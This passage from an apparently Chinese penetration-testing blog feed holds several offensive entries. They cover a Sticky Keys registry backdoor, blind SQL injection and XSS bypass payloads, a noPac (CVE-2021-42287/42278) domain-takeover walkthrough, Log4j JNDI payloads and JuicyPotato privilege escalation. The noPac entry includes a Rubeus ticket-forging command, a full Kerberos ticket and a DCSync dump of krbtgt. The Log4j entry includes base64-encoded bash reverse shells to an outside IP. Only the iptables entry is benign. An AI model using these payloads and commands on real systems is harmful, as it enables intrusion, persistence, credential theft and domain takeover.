class="line">     <span class="comment"># Sticky Keys backdoor does not exist, let&#x27;s add it.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key not found. Attempting to add Sticky Keys backdoor to registry.&quot;</span>    </span><br><span class="line">     <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$registryPath</span> <span class="literal">-Name</span> <span class="variable">$keyName</span> | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) <span class="literal">-Name</span> <span class="variable">$stringName</span> <span class="literal">-Value</span> <span class="variable">$binaryValue</span> | <span class="built_in">Out-Null</span>     </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Keys backdoor added.&quot;</span>     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="劫持后门"><a href="#劫持后门" class="headerlink" title="劫持后门"></a>劫持后门</h4><br>

<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><br>

<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><br>

<h4 id="新服务"><a href="#新服务" class="headerlink" title="新服务"></a>新服务</h4><br>

<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4>]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>Regexp注入</title>
    <url>/posts/6cc02bf9/</url>
    <content><![CDATA[<p>直接查询自己需要的数据，然后通过正则表达式进行匹配 用于盲注中</p>
<br>

<p>regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) </code>    # 判断第一个字符是不是 a-z</p>
<br>

<p>regexp ‘^e’ 判断第一个字符串是否为e</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </code> # 判断第一个字符是不是 e</p>
<br>

<p>regexp ‘^e[a-z]’ 判断一个表的第二个字符串是否在a-z中</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e[a-z]&#39; LIMIT 0,1)</code></p>
]]></content>
  </entry>
  <entry>
    <title>信息收集可能会用到的站点</title>
    <url>/posts/4259031d/</url>
    <content><![CDATA[<p>国家企业信用信息公示系统 网址：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>香港查册中心网址：<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>台湾商工行政务服务入口网<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>英国工商信息<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>美国工商信息网址：<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>新加坡工商信息网站：<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>澳大利亚工商信息网址：<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>印度工商信息 网址：<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>第三方企业查询网站  网址：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>企查查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>爱企查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>启信宝  网址：<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates 网址：<a href="https://opencorporates.com/">https://opencorporates.com/</a> 可查询全球公司基本工商信息。<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>百度 网址：<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次XXS绕过学习</title>
    <url>/posts/b6714d8e/</url>
    <content><![CDATA[<p>参考原文 <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
<h3 id="alert绕过"><a href="#alert绕过" class="headerlink" title="alert绕过"></a>alert绕过</h3><p>alert(1)   — &gt;    a=alert;a(1) </p>
<br>

<h3 id="事件拦截绕过"><a href="#事件拦截绕过" class="headerlink" title="事件拦截绕过"></a>事件拦截绕过</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
<p>oninvalid事件会以正则表达式去判断pattern的值，如果输入框内的值不全等余“a” </p>
<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
<br>

<h3 id="disable属性绕过"><a href="#disable属性绕过" class="headerlink" title="disable属性绕过"></a>disable属性绕过</h3><p>disable=”disable”  —&gt; a=”disable=”disable”</p>
<br>

<br>

<br>

<p>xss 插入的 type 即是 text 又是 submit，在文本框中按回车即可触发</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278复现</title>
    <url>/posts/1fd95242/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</p>
<p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
<p><a href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
<p><a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>域内普通用户</p>
<p><code>lab\user01 </code>  / <code>Test.123</code></p>
<p>Win2008</p>
<p>Win2012</p>
<h3 id="复现踩坑"><a href="#复现踩坑" class="headerlink" title="复现踩坑"></a><em>复现</em>踩坑</h3><h4 id="创建域用户hello"><a href="#创建域用户hello" class="headerlink" title="创建域用户hello"></a>创建域用户hello</h4><p>这里使用一个域内普通用户进行登录  下载Powermad.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/1.png" alt="截图"></p>
<p><img src="/posts/1fd95242/2.png" alt="截图"></p>
<p>成功创建用户test</p>
<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN&#x3D;hello,CN&#x3D;Computers,DC&#x3D;lab,DC&#x3D;com&quot;  -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先用<code>setspn</code>查一下 </p>
<p><code>setspn -Q */* | findstr hola</code></p>
<p><img src="/posts/1fd95242/3.png" alt="截图"></p>
<br>

<p>这里 我另起了一个powershell去引用桌面上的cmd 结果会报错 ，然后把powerview放在Powermad同目录下导入就不报错了…. （不知道为啥…）</p>
<p><img src="/posts/1fd95242/4.png" alt="截图"></p>
<p>移动后就正常了</p>
<p><img src="/posts/1fd95242/5.png" alt="截图"></p>
<p>(<del>在win2012powershell下 Set-DomainObject没有这个东西？？？！！！)…</del></p>
<p>发现两个powerview.ps1 大小不一样 不是同一个 服了…… 一个700+K 一个300+K</p>
<p>然后去尝试删除spn 。。。</p>
<p><img src="/posts/1fd95242/6.png" alt="截图"></p>
<br>

<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p>改为域控名</p>
<p><img src="/posts/1fd95242/7.png" alt="截图"></p>
<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错…….$#%@&amp;@!#@!…….</del></p>
<p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0 然后去下载下来安装，结果安装超时了，这台机器的网络…</del></p>
<p>后面找了个 .net4.5免安装版就可用去使用Rebues。。。。</p>
<br>

<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建机器用户hello"><a href="#创建机器用户hello" class="headerlink" title="创建机器用户hello"></a>创建机器用户hello</h4><h4 id="删除spn记录-1"><a href="#删除spn记录-1" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><p><img src="/posts/1fd95242/8.png" alt="截图"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="重新设置机器名"><a href="#重新设置机器名" class="headerlink" title="重新设置机器名"></a>重新设置机器名</h4><p><img src="/posts/1fd95242/9.png" alt="截图"></p>
<br>

<h4 id="请求TGT-1"><a href="#请求TGT-1" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><img src="/posts/1fd95242/10.png" alt="截图"></p>
<br>

<h4 id="恢复原来的机器属性"><a href="#恢复原来的机器属性" class="headerlink" title="恢复原来的机器属性"></a>恢复原来的机器属性</h4><p><img src="/posts/1fd95242/11.png" alt="截图"></p>
<br>

<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;nowrap &#x2F;dc:DC01.lab.com &#x2F;self &#x2F;altservice:LDAP&#x2F;DC01.lab.com  &#x2F;ptt &#x2F;ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN&#x2F;EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv&#x2F;iZtG3rvGdHafJxyD3b&#x2F;GfWSVLt3c1Ev7LGf9mUP&#x2F;tDzsxQ46mDgdbUiuB5B7&#x2F;z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa&#x2F;wqAkIl9cmO7d&#x2F;hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG&#x2F;W&#x2F;+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM&#x2F;1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J&#x2F;EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5&#x2F;4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73&#x2F;NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+&#x2F;WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386&#x2F;NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><del>这里不管使用cmd 还是powershell  命令太长了被分成了两个……？？？</del></p>
<p>额 居然是在复制时候 太长notepad给自己换行了</p>
<p><img src="/posts/1fd95242/12.png" alt="截图"></p>
<br>

<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:lab\krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/13.png" alt="截图"></p>
<br>

<h4 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h4><p><code>klist purge</code></p>
<br>

<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<p>在win2008下 提示需要 .Net4.0 结果安装失败了..</p>
<p>然后换win2012R2 的一台域机器去复现</p>
<p>0x01 扫描探测</p>
<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  （这里密码加’’会报错）</p>
<p><img src="/posts/1fd95242/14.png" alt="截图"></p>
<p>复现失败，可用创建用户，但是再</p>
<p>然后尝试再这个普通域用户下去安装python 但是报错策略XX 失败  python安装也超时了 **@#￥@**@$@#</p>
<p> 去尝试安装。net4.5  还是超时了 这个域环境是别人给我的  真***烂，PTT,PTK,PTH都实验不了 机器网也问题很大 能访问bing 别的访问不了….</p>
<h4 id="踩完的后的利用。。。"><a href="#踩完的后的利用。。。" class="headerlink" title="踩完的后的利用。。。"></a>踩完的后的利用。。。</h4><h5 id="扫描探测"><a href="#扫描探测" class="headerlink" title="扫描探测"></a>扫描探测</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  这里密码处网上加的’’但是这里我加上就会报错 不加的话可正常使用</p>
<p><img src="/posts/1fd95242/15.png" alt="截图"></p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
<p><code>ls  \\DC01.lab.com\C$ </code></p>
<p><img src="/posts/1fd95242/16.png" alt="截图"></p>
<br>

<p>还有个python版的noPac 但是这台机器上的python是离线安装的 pip还不知道怎么安 ┭┮﹏┭┮ 踩坑踩了一天终于能复现到了</p>
<br>

<h4 id="noPac（python）"><a href="#noPac（python）" class="headerlink" title="noPac（python）"></a>noPac（python）</h4><p> <a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<br>

<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
<p>Python 利用脚本：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
<p>这个还没尝试 <a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<br>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个洞复现踩了好多坑….用了一天的时间….</p>
<p>由于测试机器使用的域内普通用户，在下载、安装上都会受到限制，然后选择采取使用离线安装的方式去下载相关版本，只下载了免安装的.net 4.6和 py3.7 但是py3的pip还没整上去，后续的exp脚本就没有测试。</p>
<p>还有就是因为是在虚拟机上运行的，且是使用的域内普通用户，因此这个vmtools 无法直接从外面复制进来文件，而且在尝试直接使用python http服务去下载是 默认浏览器存在安全策略，而普通用户无法关闭，然后我去用administrator去关闭了IE安全策略后，还是存在安全策略，然后没法使用。只能通过在测试机器上去访问administrator目录下 从外面拖进来的所需要的文件</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j_rce利用</title>
    <url>/posts/5bd4bc7e/</url>
    <content><![CDATA[<p>程序在使用日志读取用户输入时，攻击者可以构造恶意代码${}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;f03b65e6.dns.1433.eu.org.&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash转码&quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping &#96;whoami&#96;.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>感觉对于一些小型企业基本不会去使用这个东西，对于大型站点可能会去使用，但是往往他们的防护也及时，今天下午试了一些国外站点，基本上都不出网没法成功利用。。。</p>
]]></content>
      <categories>
        <category>log4j</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables简单使用</title>
    <url>/posts/1d385bbc/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看现在iptables规则</span><br><span class="line">iptables -L -n -v</span><br><span class="line"></span><br><span class="line">#配置，禁止进，允许出，允许回环网卡</span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -A OUTPUT -j ACCEPT</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ping</span><br><span class="line">iptables -A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ssh</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ftp</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许DNS</span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许http和https</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许已建立的或相关连的通行</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">#禁止其他未允许的规则访问</span><br><span class="line">iptables -A INPUT -j REJECT #（注意：如果22端口未加入允许规则，SSH链接会直接断开。）</span><br><span class="line">iptables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">#屏蔽IP</span><br><span class="line">iptables -I INPUT -s 192.168.1.4 -j DROP       #屏蔽单个IP的命令</span><br><span class="line">iptables -I INPUT -s 123.0.0.0&#x2F;8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.0.0&#x2F;16 -j DROP    #封IP段即从192.168.0.1到192.168.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.1.0&#x2F;24 -j DROP    #封IP段即从192.168.1.1到192.168.1.254</span><br><span class="line"></span><br><span class="line">#删除已添加的iptables规则  -D</span><br><span class="line">iptables -D INPUT -s 192.168.1.4 -j DROP</span><br><span class="line">iptables -D INPUT 3 #删除第三条</span><br><span class="line"></span><br><span class="line">#清除防火墙规则</span><br><span class="line">iptables -F	</span><br></pre></td></tr></table></figure>



<p>参考  <a href="https://www.cnblogs.com/hellxz/p/9688044.html">https://www.cnblogs.com/hellxz/p/9688044.html</a></p>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows提权篇</title>
    <url>/posts/61d7ac81/</url>
    <content><![CDATA[<h3 id="Windows中的用户与组"><a href="#Windows中的用户与组" class="headerlink" title="Windows中的用户与组"></a>Windows中的用户与组</h3><p><img src="/posts/61d7ac81/1.png"></p>
<h3 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过各种⽅法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执⾏命令。</p>
<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
<li>获取高权限令牌——token</li>
<li>SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</li>
</ul>
<blockquote>
<p>当⽤户具有 SeImpersonatePrivilege 特权，可以调⽤ CreateProcessWithTokenW 以某 个Token的权限启动新进程。 </p>
<p>当⽤户具有 SeAssignPrimaryTokenPrivilege 特权，可以调⽤ CreateProcessAsUserW 以指定⽤户权限启动新进程。</p>
</blockquote>
<p><em>Windows的token</em></p>
<ul>
<li>Delegation token(授权令牌):⽤于交互会话登录(例如本地⽤户直接登录、远程桌⾯登录) </li>
<li>Impersonation token(模拟令牌):⽤于⾮交互登录(利⽤net use访问共享⽂件夹</li>
</ul>
<p><em>Windows服务使用的登录账户</em></p>
<ul>
<li>NT AUTHORITY\System </li>
<li>NT AUTHORITY\Network Service </li>
<li>NT AUTHORITY\Local Service</li>
</ul>
<h4 id="Juicypotato-MS16-075"><a href="#Juicypotato-MS16-075" class="headerlink" title="Juicypotato(MS16-075)"></a>Juicypotato(MS16-075)</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>通过DCOM 来使服务向攻击者监听的端⼝发起连接并进⾏NTLM认证。</p>
<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul>
<li>1.开启SeImpersonate或者SeAssignPrimaryToken权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;all</span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/2.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>

<ul>
<li>2.查看RPC默认端口是否为135</li>
</ul>
<p><code>netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow</code></p>
<p><img src="/posts/61d7ac81/5.png"></p>
<ul>
<li>3.根据操作系统选择可用的CLSID</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<p><img src="/posts/61d7ac81/3.png"></p>
<p><img src="/posts/61d7ac81/4.png"></p>
<ul>
<li>4.选择一个系统未占用的端口作为监听端口</li>
</ul>
<p> <code>-l</code> 指定监听端口</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><ul>
<li>1.Juicy_potato（原版）</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\&gt;JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line"></span><br><span class="line">Mandatory args:</span><br><span class="line">-t createprocess调用: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both</span><br><span class="line">-p &lt;program&gt;: 运行指定程序</span><br><span class="line">-l &lt;port&gt;: COM服务器侦听端口</span><br><span class="line"></span><br><span class="line">Optional args:</span><br><span class="line">-m &lt;ip&gt;: COM服务器侦听地址 (默认 127.0.0.1)</span><br><span class="line">-a &lt;argument&gt;: 传递给程序命令行参数 (默认 NULL)</span><br><span class="line">-k &lt;ip&gt;: RPC服务器IP地址 (默认 127.0.0.1)</span><br><span class="line">-n &lt;port&gt;: RPC服务器侦听端口 (默认 135)</span><br><span class="line">-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato&#x2F;tree&#x2F;master&#x2F;CLSID</span><br><span class="line">-z 仅测试CLSID并打印令牌的用户</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/6.png"></p>
<p>然后会弹出一个cmd <code>whoami</code> 查看为system权限</p>
<p><img src="/posts/61d7ac81/7.png"></p>
<ul>
<li>2.JuicyPotatoWeb(改)</li>
</ul>
<p><img src="/posts/61d7ac81/8.png"></p>
<p><code>JuicyPotatowweb.exe -p whoami</code></p>
